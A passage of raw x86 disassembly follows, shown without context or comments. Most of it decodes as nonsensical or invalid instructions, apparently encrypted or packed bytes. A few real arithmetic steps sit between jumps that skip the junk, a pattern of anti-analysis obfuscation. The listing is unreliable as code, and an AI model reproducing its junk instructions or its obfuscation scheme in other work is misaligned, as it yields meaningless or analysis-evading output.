  4049e4:	iret   
  4049e5:	dec    eax
  4049e6:	adc    bl,BYTE PTR [edi+0x41]
  4049e9:	popf   
  4049ea:	cmc    
  4049eb:	jle    0x4049bf
  4049ed:	jle    0x404a4a
  4049ef:	mul    esp
  4049f1:	mov    DWORD PTR [edx+0x313d0b5e],esi
  4049f7:	cmp    ch,BYTE PTR [edi+0x10d61d2c]
  4049fd:	lock xlat BYTE PTR ds:[ebx]
  4049ff:	inc    esp
  404a00:	jp     0x404a52
  404a02:	xchg   ebx,eax
  404a03:	sbb    BYTE PTR [ebx+0x12d1643d],al
  404a09:	or     eax,0xf24f59c6
  404a0e:	pop    es
  404a0f:	mov    dh,0x17
  404a11:	and    dl,bl
  404a13:	add    esp,DWORD PTR [esi]
  404a15:	mov    ecx,0x85d067c
  404a1a:	mov    DWORD PTR [ebp-0x7d],ebp
  404a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1e:	push   ds
  404a1f:	jb     0x4049a8
  404a21:	in     al,0x3b
  404a23:	out    dx,eax
  404a24:	ins    DWORD PTR es:[edi],dx
  404a25:	push   ecx
  404a26:	pop    ebx
  404a27:	call   0x4ff3:0x878e3924
  404a2e:	mov    dh,0x38
  404a30:	jge    0x4049d3
  404a32:	add    al,0x60
  404a34:	(bad)  
  404a35:	test   al,0x7a
  404a37:	mov    ds:0xbc6fb8a5,eax
  404a3c:	adc    eax,0x9e28ca2e
  404a41:	xchg   ebx,eax
  404a42:	sti    
  404a43:	inc    esi
  404a44:	mov    al,0x2d
  404a46:	out    0x35,al
  404a48:	gs push ds
  404a4a:	jecxz  0x404a56
  404a4c:	mov    DWORD PTR [ebp+0x2aa41e00],ebx
  404a52:	fmul   st,st(2)
  404a54:	int    0xc7
  404a56:	inc    bp
  404a58:	mov    cl,0x20
  404a5a:	jmp    0x4049e0
  404a5c:	shl    BYTE PTR [edi],1
  404a5e:	cmp    al,0x33
  404a60:	ins    BYTE PTR es:[edi],dx
  404a61:	pop    esi
  404a62:	and    BYTE PTR [ebx],dh
  404a64:	pop    edi
  404a65:	mov    eax,0xf0435d2d
  404a6a:	mov    al,0x6c
  404a6c:	inc    ebp
  404a6d:	mov    ch,0xe
  404a6f:	add    eax,0x491b104f
  404a74:	mov    bl,0xa0
  404a76:	mov    bl,0x99
  404a78:	retf   0xec26
  404a7b:	ins    BYTE PTR es:[edi],dx
  404a7c:	mov    esp,0x688399c2
  404a81:	rcl    DWORD PTR [edi+0x78b8f9c2],0xe3
  404a88:	pop    esi
  404a89:	call   FWORD PTR [ebx+ecx*4-0x3ec7d3ba]
  404a90:	or     eax,0xcae322fb
  404a95:	not    DWORD PTR [edi+eax*8]
  404a98:	fimul  WORD PTR [ebx+0x644a108d]
  404a9e:	mov    eax,ds:0x923da099
  404aa3:	inc    ecx
  404aa4:	lock out 0x2f,eax
  404aa7:	jbe    0x404adc
  404aa9:	jmp    0x6c56:0xb5db44cd
  404ab0:	gs inc eax
  404ab2:	sub    DWORD PTR [eax+0x2a],ebx
  404ab5:	je     0x404a7b
  404ab7:	add    edx,ebp
  404ab9:	test   DWORD PTR [esi+edi*8],esi
  404abc:	imul   BYTE PTR [ecx+0x1bcab471]
  404ac2:	push   cs
  404ac3:	lock cmp BYTE PTR [edi-0x62],bh
  404ac7:	call   0x97021b53
  404acc:	mov    bh,0xb9
  404ace:	push   cs
  404acf:	or     edx,DWORD PTR [edi-0x157d62a9]
  404ad5:	aas    
  404ad6:	scas   al,BYTE PTR es:[edi]
  404ad7:	(bad)
  404adb:	enter  0xa478,0x40
  404adf:	(bad)
  404ae2:	into   
  404ae3:	cli    
  404ae4:	and    ecx,eax
  404ae6:	add    esi,DWORD PTR [ecx+ecx*8]
  404ae9:	(bad)  
  404aea:	ds loope 0x404aa2
  404aed:	ja     0x404b22
  404aef:	leave  
  404af0:	jnp    0x404b59
  404af2:	mov    al,ds:0x25fa3308
  404af7:	add    esi,DWORD PTR [edi]
  404af9:	pop    ds
  404afa:	(bad)  
  404afb:	xchg   esi,eax
  404afc:	cmp    bl,cl
  404afe:	fsubr  DWORD PTR [ecx-0x80]
  404b01:	and    BYTE PTR [edx],ah
  404b03:	jmp    0x8708:0xccb19bdc
  404b0a:	test   al,0xf5
  404b0c:	cmp    ebx,DWORD PTR [eax]
  404b0e:	cli    
  404b0f:	xor    eax,0x42001f9b
  404b14:	(bad)  
  404b15:	jns    0x404aca
  404b17:	mov    ecx,fs
  404b19:	pop    esi
  404b1a:	fmul   st(6),st
  404b1c:	mov    bh,0x45
  404b1e:	mov    ebx,0xce1b90fd
  404b23:	ficom  WORD PTR [edx]
  404b25:	xchg   ecx,eax
  404b26:	(bad)  [edi-0x4a]
  404b29:	test   DWORD PTR [edi],ecx
  404b2b:	mov    bl,0x78
  404b2d:	(bad)  [esp+eiz*8-0x5db75900]
  404b34:	fdivp  st(3),st
  404b36:	fcmovne st,st(6)
  404b38:	daa    
  404b39:	test   al,0x92
  404b3b:	(bad)  
  404b3c:	mov    al,ds:0x9131d1b5
  404b41:	or     al,dh
  404b43:	jae    0x404b75
  404b45:	mov    ds:0x61527635,al
  404b4a:	leave  
  404b4b:	cmp    al,0x49
  404b4d:	pop    esi
  404b4e:	in     al,dx
  404b4f:	pop    edi
  404b50:	xchg   esp,eax
  404b51:	mov    edx,0x770578e5
  404b56:	sbb    DWORD PTR [ebp-0x6cd1c0d6],edx
  404b5c:	loopne 0x404b9c
  404b5e:	fbstp  TBYTE PTR [edx-0x17]
  404b61:	mov    ds:0x1631b02b,eax
  404b66:	bound  esp,QWORD PTR [eax*4-0x5d4061b6]
  404b6d:	push   esp
  404b6e:	inc    edx
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	mov    ebp,esi
  404b9a:	iret   
  404b9b:	sub    BYTE PTR [esi],0x2e
  404b9e:	jle    0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b3b
  404ba5:	(bad)  
  404ba6:	xlat   BYTE PTR ds:[ebx]
  404ba7:	aas    
  404ba8:	dec    edx
  404ba9:	pop    ebp
  404baa:	xchg   ebx,eax
  404bab:	push   ss
  404bac:	mov    ebp,0x238bc4eb
  404bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb2:	cmp    eax,0xa5497f7e
  404bb7:	jmp    DWORD PTR [edx-0x3f]
  404bba:	pop    ebx
  404bbb:	add    BYTE PTR [ebx+0x5e],ch
  404bbe:	stos   BYTE PTR es:[edi],al
  404bbf:	sub    bl,BYTE PTR [eax+edi*4]
  404bc2:	push   cs
  404bc3:	sbb    eax,0x7cff8339
  404bc8:	mov    ah,0xe1
  404bca:	mov    bh,al
  404bcc:	loope  0x404bb1
  404bce:	ins    DWORD PTR es:[edi],dx
  404bcf:	and    cl,dh
  404bd1:	sbb    ebx,ebx
  404bd3:	lock in al,dx
  404bd5:	sbb    BYTE PTR [esi+0x4d],0x6e
  404bd9:	or     eax,0xc8fdc8f4
  404bde:	pop    edi
  404bdf:	xchg   ecx,eax
  404be0:	sbb    BYTE PTR [ebx+0x5e],ah
  404be3:	es dec edx
  404be5:	inc    esp
  404be6:	ret    0xf5ca
  404be9:	(bad)  
  404bea:	sbb    dl,cl
  404bec:	int3   
  404bed:	gs push esi
  404bef:	pushf  
  404bf0:	sahf   
  404bf1:	sub    al,0xb5
  404bf3:	sbb    ebx,edi
  404bf5:	add    dl,BYTE PTR [esi+0x5b]
  404bf8:	and    ecx,DWORD PTR [ebp-0x5]
  404bfb:	cmp    DWORD PTR [ebx],ecx
  404bfd:	les    ecx,FWORD PTR [eax-0x6867834d]
  404c03:	adc    BYTE PTR [ecx-0x3a047b08],dl
  404c09:	scas   al,BYTE PTR es:[edi]
  404c0a:	mov    DWORD PTR [esi-0x49],edx
  404c0d:	stc    
  404c0e:	push   0x10
  404c10:	fdivr  QWORD PTR [ebx-0x26920d77]
  404c16:	pop    ebx
  404c17:	inc    ecx
  404c18:	add    BYTE PTR [eax+eax*1-0x36],bl
  404c1c:	or     eax,0x68dde38b
  404c21:	ret    
  404c22:	addr16 (bad) 
  404c24:	pusha  
  404c25:	inc    ecx
  404c26:	inc    edx
  404c27:	or     al,0xb
  404c29:	pop    eax
  404c2a:	push   0x50
  404c2c:	hlt    
  404c2d:	stos   BYTE PTR es:[edi],al
  404c2e:	push   es
  404c2f:	jg     0x404c73
  404c31:	sbb    eax,0xb3000ac8
  404c36:	add    al,0x16
  404c38:	cld    
  404c39:	inc    edx
  404c3a:	mov    cs,WORD PTR [edx]
  404c3c:	adc    eax,0xb2fb96fc
  404c41:	js     0x404c63
  404c43:	xlat   BYTE PTR ds:[ebx]
  404c44:	push   ds
  404c45:	pop    edi
  404c46:	fs xchg esi,eax
  404c48:	cmp    dl,ch
  404c4a:	jae    0x404c6f
  404c4c:	imul   edi,DWORD PTR [eax+0x75],0x3430dd42
  404c53:	mov    al,ds:0xccfb965c
  404c58:	sub    DWORD PTR [esi-0x52f45792],0x6f85569d
  404c62:	jmp    FWORD PTR [ecx-0x12]
  404c65:	clc    
  404c66:	jg     0x404c00
  404c68:	pusha  
  404c69:	xchg   edx,eax
  404c6a:	dec    ecx
  404c6b:	fwait
  404c6c:	fs out 0x7e,eax
  404c6f:	pop    ebp
  404c70:	and    bh,BYTE PTR fs:[ebx-0x2f03084a]
  404c77:	and    BYTE PTR [edi],dh
  404c79:	ror    BYTE PTR [ebp-0xc26bbec],1
  404c7f:	lods   eax,DWORD PTR ds:[esi]
  404c80:	push   ss
  404c81:	lods   al,BYTE PTR ds:[esi]
  404c82:	inc    DWORD PTR [ebp-0x75]
  404c85:	xor    bh,dl
  404c87:	inc    ebx
  404c88:	scas   eax,DWORD PTR es:[edi]
  404c89:	sub    ebx,DWORD PTR [ebp+0x75]
  404c8c:	out    dx,al
  404c8d:	adc    al,0x17
  404c90:	test   eax,0x197d644c
  404c95:	sbb    al,0x86
  404c97:	test   eax,0x2721971
  404c9c:	lds    esi,FWORD PTR [edi+ebx*8-0x3b]
  404ca0:	lock call 0x9002d6b2
  404ca6:	adc    BYTE PTR [edi-0x4f52b2d5],dh
  404cac:	mov    DWORD PTR [esi+esi*2],eax
  404caf:	sub    eax,0xa7383773
  404cb4:	push   eax
  404cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb6:	gs cdq 
  404cb8:	inc    ebx
  404cb9:	repz mov ch,0x43
  404cbc:	scas   al,BYTE PTR es:[edi]
  404cbd:	xchg   ebp,eax
  404cbe:	jle    0x404cb4
  404cc0:	jne    0x404ccd
  404cc2:	dec    edi
  404cc3:	pop    eax
  404cc4:	xor    eax,0xd8ccc4f2
  404cc9:	hlt    
  404cca:	into   
  404ccb:	sub    eax,0x4b6f02f9
  404cd0:	mov    eax,0x35f2fe0c
  404cd5:	ret    
  404cd6:	push   edx
  404cd7:	(bad)  
  404cd8:	pusha  
  404cd9:	lods   al,BYTE PTR ds:[esi]
  404cda:	sbb    DWORD PTR [ebp-0x6b],0x1b9f46df
  404ce1:	push   0x49936519
  404ce6:	inc    esp
  404ce7:	aas    
  404ce8:	sbb    edx,DWORD PTR [eax+0xc]
  404ceb:	pop    eax
  404cec:	jle    0x404d20
  404cee:	fdivr  st,st(2)
  404cf0:	fnstsw WORD PTR [edx+0x9]
  404cf3:	fistp  QWORD PTR [eax+eax*4-0x79]
  404cf7:	jnp    0x404c8e
  404cf9:	push   0xffffffa9
  404cfb:	adc    BYTE PTR [ebx+0x19702f48],ch
  404d01:	sbb    BYTE PTR [edx-0x59],al
  404d04:	aas    
  404d05:	inc    ecx
  404d06:	jmp    0xbbc2ab73
  404d0b:	in     al,dx
  404d0c:	(bad)  
  404d0d:	je     0x404d6e
  404d0f:	lods   eax,DWORD PTR ds:[esi]
  404d10:	push   esi
  404d11:	jmp    DWORD PTR [edx-0x282fd89a]
  404d17:	mov    WORD PTR [edx],ss
  404d19:	imul   edx,DWORD PTR [ebx+0x56],0xffffffce
  404d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d1e:	jmp    0x3c921e4d
  404d23:	push   ebx
  404d24:	retf   0x15a6
  404d27:	out    dx,al
  404d28:	test   BYTE PTR [esi-0x319b180a],0xe3
  404d2f:	xchg   edx,eax
  404d30:	push   0xffffff8b
  404d32:	pop    ebp
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    ch,dl
  404d93:	adc    DWORD PTR [edx-0x25],0x7e7e2fbb
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404dfa
  404d9f:	icebp  
  404da0:	push   es
  404da1:	cmp    eax,DWORD PTR [eax-0x430d99e9]
  404da7:	add    DWORD PTR [ecx+0x5e],esp
  404daa:	pop    edx
  404dab:	sub    al,BYTE PTR ds:0x66020bb2
  404db1:	or     esi,DWORD PTR [ecx-0x53a64dc2]
  404db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404db8:	add    DWORD PTR [edx],edx
  404dba:	dec    edx
  404dbb:	add    eax,0x4a67dec7
  404dc0:	add    DWORD PTR [edi+0x4c98e007],edx
  404dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc7:	pop    ebx
  404dc8:	dec    ebp
  404dc9:	push   esp
  404dca:	or     edx,eax
  404dcc:	jae    0x404e18
  404dce:	inc    edi
  404dcf:	rcr    DWORD PTR [ebx+0xd76a358],cl
  404dd5:	ficomp WORD PTR [edi+0x7]
  404dd8:	push   0x60476590
  404ddd:	jns    0x404dab
  404ddf:	je     0x404df3
  404de1:	ja     0x404e14
  404de3:	cmp    ebx,DWORD PTR [edx+0x38274ff5]
  404de9:	stos   DWORD PTR es:[edi],eax
  404dea:	inc    eax
  404deb:	pop    esi
  404dec:	cs jb  0x404dc6
  404def:	inc    ebp
  404df0:	jl     0x404dba
  404df2:	sbb    al,0x40
  404df4:	fistp  QWORD PTR [ebx+0x1275cc5]
  404dfa:	and    cl,dl
  404dfc:	xor    BYTE PTR [edx-0x6802e8c4],cl
  404e02:	data16 sub BYTE PTR [ebp-0x72],dh
  404e06:	(bad)
  404e0a:	retf   0x3c78
  404e0d:	push   ecx
  404e0e:	imul   ebx,DWORD PTR [esi],0x70
  404e11:	lds    ecx,FWORD PTR ds:0x5538b1da
  404e17:	mov    edi,0x2c126fdf
  404e1c:	pusha  
  404e1d:	dec    edi
  404e1e:	or     al,0xdb
  404e20:	sbb    dh,BYTE PTR [eax-0xa]
  404e23:	es dec ecx
  404e25:	rcr    DWORD PTR [edi+0x2bde4d84],1
  404e2b:	sbb    bh,ch
  404e2d:	mov    ecx,0x96c3b653
  404e32:	xor    BYTE PTR [eax+0x2bb9e1ce],bl
  404e38:	sub    BYTE PTR [ebx-0x78],0x2d
  404e3c:	fldcw  WORD PTR [eax-0x68]
  404e3f:	add    bl,BYTE PTR [ebx+ecx*8]
  404e42:	enter  0x1e05,0x4a
  404e46:	aas    
  404e47:	pop    eax
  404e48:	mov    ds:0x27a54b07,eax
  404e4d:	cmp    eax,0x70f61b3
  404e52:	cmp    DWORD PTR [edx-0x78],0xffffffd9
  404e56:	or     al,0x46
  404e58:	pop    esp
  404e59:	mov    dl,0x20
  404e5b:	mov    WORD PTR [ebx-0xbbe0973],cs
  404e61:	xlat   BYTE PTR ds:[ebx]
  404e62:	lahf   
  404e63:	adc    dl,cl
  404e65:	ins    BYTE PTR es:[edi],dx
  404e66:	mov    eax,ds:0x299c0eee
  404e6b:	shr    DWORD PTR [ebp+0x28],1
  404e6e:	loop   0x404ec2
  404e70:	push   0xfffffff2
  404e72:	xor    esp,DWORD PTR [esi]
  404e74:	js     0x404eb2
  404e76:	mov    BYTE PTR [ecx],dl
  404e78:	adc    esp,DWORD PTR [edi+0x6141b847]
  404e7e:	in     eax,0x60
  404e80:	mov    eax,ds:0xcb7b1bb6
  404e85:	test   dh,cl
  404e87:	push   ebp
  404e88:	test   BYTE PTR [edx-0x1f593a6e],bl
  404e8e:	(bad)  
  404e8f:	mov    al,ds:0x800f8b48
  404e94:	mov    esp,0xdee2fa2f
  404e99:	inc    ebx
  404e9a:	aas    
  404e9b:	in     al,0xa
  404e9d:	mov    bh,0x24
  404e9f:	push   cs
  404ea0:	mov    edx,0xc4837591
  404ea5:	fld    DWORD PTR [edi]
  404ea7:	std    
  404ea8:	sysret 
  404eaa:	jmp    0xd8399e88
  404eaf:	xchg   ebp,ebx
  404eb1:	fcomi  st,st(7)
  404eb3:	cmp    eax,DWORD PTR [ebx-0x105eb239]
  404eb9:	test   al,0xeb
  404ebb:	mov    ch,0x56
  404ebd:	add    DWORD PTR [ebx],edx
  404ebf:	xor    esi,eax
  404ec1:	stc    
  404ec2:	jns    0x404e92
  404ec4:	aas    
  404ec5:	xchg   edi,eax
  404ec6:	cli    
  404ec7:	or     ecx,DWORD PTR [ecx+0x6b]
  404eca:	or     al,0x3
  404ecc:	in     eax,dx
  404ecd:	pop    eax
  404ece:	in     al,0x83
  404ed0:	sahf   
  404ed1:	imul   ebp,DWORD PTR [edi+ebp*4],0x68ea714e
  404ed8:	sub    eax,0xc2bb2bd5
  404edd:	mov    ah,0x87
  404edf:	push   edx
  404ee0:	mov    ecx,0x5cc4d662
  404ee5:	dec    esi
  404ee6:	cld    
  404ee7:	(bad)
  404eea:	mov    al,0xbd
  404eec:	xchg   ebx,eax
  404eed:	jne    0x404ef3
  404eef:	and    esi,ebp
  404ef1:	lahf   
  404ef2:	xchg   BYTE PTR [edi-0x366609dd],dh
  404ef8:	jne    0x404e9e
  404efa:	(bad)  
  404efb:	sbb    DWORD PTR [ebp+0x220a79fe],edi
  404f01:	dec    edx
  404f02:	cld    
  404f03:	into   
  404f04:	sbb    edi,esi
  404f06:	(bad)  
  404f07:	sbb    al,0x67
  404f09:	xchg   edi,eax
  404f0a:	dec    edx
  404f0b:	aad    0xce
  404f0d:	pop    ecx
  404f0e:	sahf   
  404f0f:	mul    BYTE PTR [ebx+0x217f13f1]
  404f15:	std    
  404f16:	adc    BYTE PTR [esi+0x33b74bb8],0x4f
  404f1d:	dec    ebx
  404f1e:	test   ebx,eax
  404f20:	cmp    BYTE PTR [eax-0x30d5dde],bh
  404f26:	mov    bl,0x49
  404f28:	shr    bh,0xd2
  404f2b:	xor    edi,eax
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x9dd15a29
  404f44:	sti    
  404f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f46:	mov    eax,ecx
  404f48:	and    DWORD PTR [esi+0x7e],edi
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404fbd
  404f50:	gs js  0x404f76
  404f53:	xchg   ecx,eax
  404f54:	xchg   esi,eax
  404f55:	mov    esi,0xec42b35a
  404f5a:	scas   eax,DWORD PTR es:[edi]
  404f5b:	pusha  
  404f5c:	add    eax,0x73fbbbe7
  404f61:	ins    DWORD PTR es:[edi],dx
  404f62:	ret    0xa007
  404f65:	sbb    esp,ecx
  404f67:	aad    0xc8
  404f69:	pop    edx
  404f6a:	repz sub ebx,DWORD PTR [ecx]
  404f6d:	fldcw  WORD PTR [edx+0x4c]
  404f70:	aas    
  404f71:	xlat   BYTE PTR ds:[ebx]
  404f72:	sub    eax,0xa21bd634
  404f77:	pop    ds
  404f78:	dec    edi
  404f79:	daa    
  404f7a:	aas    
  404f7b:	xchg   esi,eax
  404f7c:	xor    al,0xc5
  404f7e:	pop    ss
  404f7f:	sub    ecx,DWORD PTR [esi]
  404f81:	inc    esp
  404f82:	jl     0x404fb3
  404f84:	stc    
  404f85:	or     DWORD PTR [edi],esi
  404f87:	adc    ah,BYTE PTR [ebp+ebx*4-0x233c8537]
  404f8e:	push   eax
  404f8f:	mov    edx,0xf5dd91f4
  404f94:	and    cl,dl
  404f96:	sub    BYTE PTR [eax],dl
  404f98:	into   
  404f99:	xchg   ebx,eax
  404f9a:	scas   eax,DWORD PTR es:[edi]
  404f9b:	pop    esi
  404f9c:	dec    ecx
  404f9d:	xor    cl,BYTE PTR [edi]
  404f9f:	lahf   
  404fa0:	mov    edi,0x41e0d6c3
  404fa5:	and    al,0x54
  404fa7:	addr16 jmp 0x6657:0x39a06242
  404faf:	inc    esp
  404fb0:	lods   eax,DWORD PTR ds:[esi]
  404fb1:	iret   
  404fb2:	jmp    0x404f82
  404fb4:	fs das 
  404fb6:	jb     0x404fbf
  404fb8:	in     al,dx
  404fb9:	add    DWORD PTR [edi],0x5f
  404fbc:	xchg   edi,eax
  404fbd:	fild   QWORD PTR [esi]
  404fbf:	rcl    BYTE PTR [ecx+eax*8+0x20],1
  404fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fc4:	mov    bh,0xd7
  404fc6:	dec    esp
  404fc7:	test   al,0x92
  404fc9:	jb     0x404fb8
  404fcb:	call   FWORD PTR [edi+0x38]
  404fce:	jge    0x404f5b
  404fd0:	mov    ecx,0xcc34d511
  404fd5:	jp     0x404fe0
  404fd7:	cmp    cl,BYTE PTR [ebp+0x4f102b0f]
  404fdd:	int3   
  404fde:	inc    eax
  404fdf:	ds pop edx
  404fe1:	push   0x770bb6a0
  404fe6:	cmp    eax,0xe49c3777
  404feb:	cs stos DWORD PTR es:[edi],eax
  404fed:	ins    BYTE PTR es:[edi],dx
  404fee:	ret    
  404fef:	mov    edx,0xbc560b17
  404ff4:	dec    edx
  404ff5:	les    edi,FWORD PTR [ebx-0x6]
  404ff8:	and    BYTE PTR [ecx+0x4db1c34b],dl
  404ffe:	pop    eax
  404fff:	stos   BYTE PTR es:[edi],al
  405000:	(bad)  
  405002:	scas   al,BYTE PTR es:[edi]
  405003:	loop   0x405013
  405005:	neg    ch
  405007:	popf   
  405008:	xor    edx,DWORD PTR [esi+edx*8-0x68]
  40500c:	xchg   esp,edi
  40500e:	xor    DWORD PTR [edi+0x2],ebx
  405011:	mov    esp,DWORD PTR [edi+eiz*8]
  405014:	xor    DWORD PTR [eax+0xa1a4be7],0x51
  40501b:	and    BYTE PTR [ecx+ebx*2+0x11],al
  40501f:	fist   DWORD PTR [eax]
  405021:	lea    esp,[esi]
  405023:	dec    esp
  405024:	and    al,0x8b
  405026:	add    al,0xd3
  405028:	inc    edx
  405029:	stc    
  40502a:	jmp    0x4ca9:0x12fd53c8
  405031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405032:	outs   dx,BYTE PTR ds:[esi]
  405033:	lods   al,BYTE PTR ds:[esi]
  405034:	sub    BYTE PTR [esi+0x6e857f8f],cl
  40503a:	jg     0x405072
  40503c:	popa   
  40503d:	call   0xb1a8:0xd9875f9e
  405044:	and    esp,ebx
  405046:	mov    ah,0x93
  405048:	in     eax,0xc3
  40504a:	push   ebp
  40504b:	xor    eax,0xd4214a40
  405050:	rcl    BYTE PTR [eax],0x4
  405053:	arpl   WORD PTR [edx+0x3df3d52a],si
  405059:	jmp    0x213c450a
  40505e:	pop    edx
  40505f:	(bad)  
  405060:	out    dx,eax
  405061:	enter  0xb8d6,0xa1
  405065:	lea    ebx,[ecx+0xb]
  405068:	or     edx,edx
  40506a:	jg     0x40509c
  40506c:	add    DWORD PTR [edi],edi
  40506e:	and    al,0x8
  405070:	in     eax,dx
  405071:	aam    0xc9
  405073:	popa   
  405074:	and    edx,DWORD PTR [ecx]
  405076:	cwde   
  405077:	mov    ebx,0x9dce29e9
  40507c:	adc    bh,BYTE PTR [eax+0x1b9ad8e2]
  405082:	mov    dl,0x14
  405084:	daa    
  405085:	das    
  405086:	out    dx,eax
  405087:	shl    BYTE PTR [ecx+edx*1-0x5bdd9682],1
  40508e:	inc    ecx
  40508f:	int    0x6
  405091:	jmp    ecx
  405093:	data16 sbb bl,bh
  405096:	xor    ebp,ebp
  405098:	push   eax
  405099:	aaa    
  40509a:	mov    bl,0xaa
  40509c:	cs pop edx
  40509e:	add    eax,0xec2230c8
  4050a3:	(bad)  
  4050a4:	not    DWORD PTR [ebp+0x5]
  4050a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050a8:	xor    ch,BYTE PTR [esi+0x5ca6cb03]
  4050ae:	out    0xf,al
  4050b0:	(bad)  
  4050b1:	neg    BYTE PTR [edi-0x7a]
  4050b4:	ret    
  4050b5:	mov    ecx,0xa1c6c30
  4050ba:	jnp    0x4050e4
  4050bc:	sbb    al,0x99
  4050be:	not    BYTE PTR [esi+0x50dc3edd]
  4050c4:	dec    esi
  4050c5:	ja     0x4050fa
  4050c7:	push   esi
  4050c8:	imul   eax,DWORD PTR [edi],0xcc2cf676
  4050ce:	sub    bl,BYTE PTR [ebx]
  4050d0:	iret   
  4050d1:	iret   
  4050d2:	leave  
  4050d3:	fnsave cs:[ebp+0x75]
  4050d7:	jecxz  0x405090
  4050d9:	out    dx,eax
  4050da:	imul   esp,DWORD PTR [edx+0x33e85d8b],0x8dd12bd8
  4050e4:	mov    esp,0x32729d1f
  4050e9:	add    BYTE PTR [ebx],bh
  4050eb:	cli    
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	jle    0x4050ad
  40510f:	imul   esi,esi,0x7e7e2245
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x4050d6
  40511a:	sub    eax,0x5582ebd8
  40511f:	daa    
  405120:	mov    edx,0x4715cae2
  405125:	mov    bh,0x77
  405127:	jecxz  0x405148
  405129:	and    DWORD PTR [ebx+eax*8],eax
  40512c:	sub    DWORD PTR [ecx+0x4e84e1d6],ebx
  405132:	jmp    0x4050d1
  405134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405135:	aaa    
  405136:	dec    esi
  405137:	jecxz  0x405164
  405139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40513a:	pop    eax
  40513b:	pusha  
  40513c:	ja     0x40517b
  40513e:	jl     0x4050d8
  405140:	shl    BYTE PTR [edi+0x16],0x78
  405144:	pusha  
  405145:	cdq    
  405146:	xchg   esp,eax
  405147:	inc    ecx
  405148:	and    al,BYTE PTR [eax+0x71]
  40514b:	sbb    al,0xcd
  40514d:	jp     0x4051c9
  40514f:	pop    ss
  405150:	xlat   BYTE PTR ds:[ebx]
  405151:	push   eax
  405152:	jle    0x405123
  405154:	dec    ebp
  405155:	dec    esi
  405156:	outs   dx,DWORD PTR ds:[esi]
  405157:	shl    BYTE PTR [esi-0x5d],1
  40515a:	and    BYTE PTR [eax+0x16c7407e],0xbf
  405161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405162:	cmp    BYTE PTR [ecx-0x60],dh
  405165:	mov    dh,0x10
  405167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405168:	jmp    0x1083:0x4fa55f87
  40516f:	std    
  405170:	push   edi
  405171:	push   ds
  405172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405173:	sub    DWORD PTR [edi+0x53],esp
  405176:	and    ecx,esi
  405178:	or     ebp,DWORD PTR [edi]
  40517a:	push   cs
  40517b:	sbb    eax,0xf6c23b9e
  405180:	pusha  
  405181:	mov    ecx,0x45290f8b
  405186:	in     eax,0xf7
  405188:	(bad)  
  405189:	xlat   BYTE PTR ds:[ebx]
  40518a:	(bad)  
  40518c:	jae    0x4051ef
